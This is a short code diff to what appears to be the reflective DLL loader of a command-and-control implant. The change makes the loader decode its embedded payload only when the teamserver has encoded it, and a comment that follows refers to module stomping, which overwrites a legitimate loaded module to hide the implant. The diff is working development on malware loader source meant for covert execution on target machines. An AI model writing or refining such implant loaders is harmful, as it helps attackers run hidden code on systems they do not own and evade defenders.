@@ -78,7 +78,11 @@ SEC( text, B ) VOID Entry( VOID )
         DllStart = C_PTR( KaynLibraryLdr + RawSize );
         DllSize  = KHdrSize + KMemSize;
 
-        CryptDecodeBuffer( DllStart, DllSize, gCryptKey, CRYPT_KEY_LEN - 1 );
+        // Only decode when the teamserver actually encoded the payload (it
+        // patches gCryptKey away from the default marker). When Payload Encode
+        // is off the DLL is plaintext and decoding would corrupt the image.
+        if ( gCryptKey[ 0 ] != CRYPT_KEY_MARKER[ 0 ] )
+            CryptDecodeBuffer( DllStart, DllSize, gCryptKey, CRYPT_KEY_LEN - 1 );
     }
 
     // Optional module stomping: overwrite a legitimate, already-loaded module
